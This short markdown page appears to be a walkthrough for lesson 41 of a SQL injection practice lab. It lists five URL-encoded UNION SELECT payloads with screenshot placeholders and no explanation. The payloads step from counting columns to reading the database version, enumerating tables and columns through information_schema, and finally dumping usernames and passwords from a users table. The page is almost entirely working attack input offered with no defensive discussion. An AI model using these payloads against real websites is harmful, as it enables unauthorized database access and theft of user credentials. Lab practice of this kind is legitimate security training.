# Less-41

~~~ cmd
?id=-1%20union%20select%201,2,3
~~~

![Less-41-01](.\img\Less-41-01.png)



~~~ cmd
?id=-1%20union%20select%201,version(),database()
~~~

![Less-41-02](.\img\Less-41-02.png)



~~~ cmd
?id=-1%20union%20select%201,version(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()
~~~

![Less-41-03](.\img\Less-41-03.png)



~~~ cmd
?id=-1%20union%20select%201,version(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name="users"
~~~

![Less-41-04](.\img\Less-41-04.png)



~~~ cmd
?id=-1%20union%20select%201,version(),group_concat(username,password)%20from%20users
~~~

![Less-41-05](.\img\Less-41-05.png)



